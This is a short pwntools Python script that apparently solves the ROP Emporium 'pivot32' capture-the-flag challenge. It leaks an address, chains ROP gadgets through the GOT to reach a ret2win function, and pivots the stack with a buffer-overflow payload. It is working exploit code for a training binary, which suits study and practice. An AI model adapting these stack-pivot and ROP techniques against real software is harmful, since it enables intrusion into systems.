from pwn import *
context.log_level = 'debug'

p="./pivot32"
libp=ELF("./libpivot32.so")
elf=ELF("./pivot32")

context.binary=p
io=process(p)

offset=int(libp.symbols["ret2win"]-libp.symbols["foothold_function"])
print(offset)

leave_ret=0x0804889F
foothold_plt=elf.plt["foothold_function"]
foothold_got=elf.got["foothold_function"]

pop_eax=0x080488c0 
pop_ebx=0x08048571
add_eax_ebx=0x080488c7
mov_eax_eax=0x080488c4
call_eax=0x080486a3

leakaddr = int(io.recv().split()[20], 16)
print("leakaddr: "+hex(leakaddr))

payload1=p32(foothold_plt)+p32(pop_eax)+p32(foothold_got)+p32(mov_eax_eax)+p32(pop_ebx)+p32(offset)+p32(add_eax_ebx)+p32(call_eax)

io.sendline(payload1)

payload2="a"*40+p32(leakaddr-4)+p32(leave_ret)

io.sendline(payload2)

print(io.recvall())
